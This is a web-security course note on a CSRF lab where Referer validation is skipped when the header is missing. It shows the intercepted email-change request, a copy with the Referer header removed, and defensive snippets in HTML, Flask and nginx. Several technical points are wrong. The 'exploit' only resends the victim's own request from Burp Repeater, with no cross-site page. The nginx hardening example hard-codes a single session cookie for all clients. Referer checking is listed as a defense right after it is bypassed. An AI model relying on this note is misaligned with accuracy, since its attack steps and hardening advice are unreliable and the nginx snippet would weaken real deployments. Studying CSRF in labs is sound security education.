---
course: Web Security
topic: Cross-Site Request Forgery (CSRF)
tags: [web-security]
---

## Lab Setup and Initial Exploration

In this lab, we will explore a CSRF vulnerability where the `Referer` header validation depends on the header being present. We will use Burp Suite Professional to intercept and manipulate HTTP requests, and then we will script the exploit using only features available in the community edition of Burp.

### Logging In to the Lab

First, we need to log in to the lab environment using the provided credentials. Let's assume the credentials are:

```plaintext
Username: user@example.com
Password: password123
```

We will use these credentials to authenticate and establish a session.

### Accessing the Lab Environment

1. Open the lab URL in your browser.
2. Enter the provided credentials and log in.

Once logged in, we can proceed to the next steps.

### Using Burp Suite Professional

Burp Suite is a powerful tool for web application security testing. We will use it to intercept and modify HTTP requests to exploit the CSRF vulnerability.

#### Step 1: Setting Up Burp Suite

1. **Start Burp Suite**: Launch Burp Suite Professional.
2. **Configure Proxy**: Set up the proxy to intercept traffic between your browser and the web application.
3. **Configure FoxyProxy**: Ensure your browser is configured to route traffic through Burp Suite.

#### Step 2: Intercepting Requests

1. **Navigate to Email Change Functionality**: Click on the "My Account" section and navigate to the email change functionality.
2. **Intercept the Request**: Use Burp Suite to intercept the HTTP request sent when attempting to change the email address.

### Analyzing the Intercepted Request

The intercepted request might look something like this:

```http
POST /change-email HTTP/1.1
Host: vulnerable-app.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123
Referer: http://vulnerable-app.example.com/my-account
Content-Length: 30

email=newemail@example.com
```

### Crafting the Exploit

To exploit the CSRF vulnerability, we need to craft a request that will be sent to the server without the `Referer` header. This can be achieved by manipulating the request in Burp Suite.

#### Step 1: Remove the Referer Header

1. **Send to Repeater**: Send the intercepted request to Burp Suite Repeater.
2. **Remove the Referer Header**: Delete the `Referer` header from the request.

The modified request should look like this:

```http
POST /change-email HTTP/1.1
Host: vulnerable-app.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123
Content-Length: 30

email=newemail@example.com
```

#### Step 2: Send the Modified Request

1. **Send the Request**: Use Burp Suite Repeater to send the modified request to the server.
2. **Observe the Response**: Check the response to see if the email address was successfully changed.

### Expected Result

If the CSRF vulnerability is exploited successfully, the server should respond with a 302 redirect followed by a 200 OK response indicating that the email address was changed.

```http
HTTP/1.1 302 Found
Location: /my-account
Content-Type: text/html; charset=UTF-8
Set-Cookie: session=def456; Path=/; HttpOnly
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: session=def456; Path=/; HttpOnly
Content-Length: 1024

<!DOCTYPE html>
<html>
<head>
    <title>Email Changed</title>
</head>
<body>
    <h1>Email Successfully Changed</h1>
</body>
</html>
```

### How to Prevent / Defend Against CSRF

To prevent CSRF attacks, web applications should implement the following defenses:

1. **CSRF Tokens**: Generate unique tokens for each session and include them in forms and AJAX requests.
2. **SameSite Cookies**: Use the `SameSite` attribute to restrict how cookies are sent with cross-site requests.
3. **Referer Header Validation**: Validate the `Referer` header to ensure requests originate from the same domain.

#### Secure Coding Fixes

Here is an example of how to implement CSRF tokens in a form:

**Vulnerable Code:**

```html
<form action="/change-email" method="POST">
    <input type="email" name="email" value="newemail@example.com">
    <button type="submit">Change Email</button>
</form>
```

**Secure Code:**

```html
<form action="/change-email" method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="email" name="email" value="newemail@example.com">
    <button type="submit">Change Email</button>
</form>
```

**Server-Side Validation:**

```python
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'your_secret_key'

@app.route('/change-email', methods=['POST'])
def change_email():
    if request.form['csrf_token'] != session['csrf_token']:
        return "Invalid CSRF token", 403
    new_email = request.form['email']
    # Update the email in the database
    return "Email successfully changed"
```

### Configuration Hardening

Ensure that your web server and application configurations are hardened against CSRF attacks. Here is an example of configuring Nginx to enforce the `SameSite` attribute:

**Nginx Configuration:**

```nginx
server {
    listen 80;
    server_name example.com;

    location / {
        add_header Set-Cookie "session=abc123; SameSite=Strict";
        # Other configurations
    }
}
```

### Detection

To detect CSRF vulnerabilities, you can use automated tools like:

- **OWASP ZAP**: An open-source web application security scanner.
- **Burp Suite**: A comprehensive toolkit for web application security testing.

### Hands-On Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a series of labs specifically designed to teach and test web security concepts, including CSRF.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.

By thoroughly understanding and implementing these defenses, you can significantly reduce the risk of CSRF attacks on your web applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/08-Lab 7 CSRF where Referer validation depends on header being present/06-How to Prevent  Defend Against CSRF|How to Prevent  Defend Against CSRF]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/08-Lab 7 CSRF where Referer validation depends on header being present/00-Overview|Overview]] | [[08-Understanding Cross-Site Request Forgery (CSRF)|Understanding Cross-Site Request Forgery (CSRF)]]
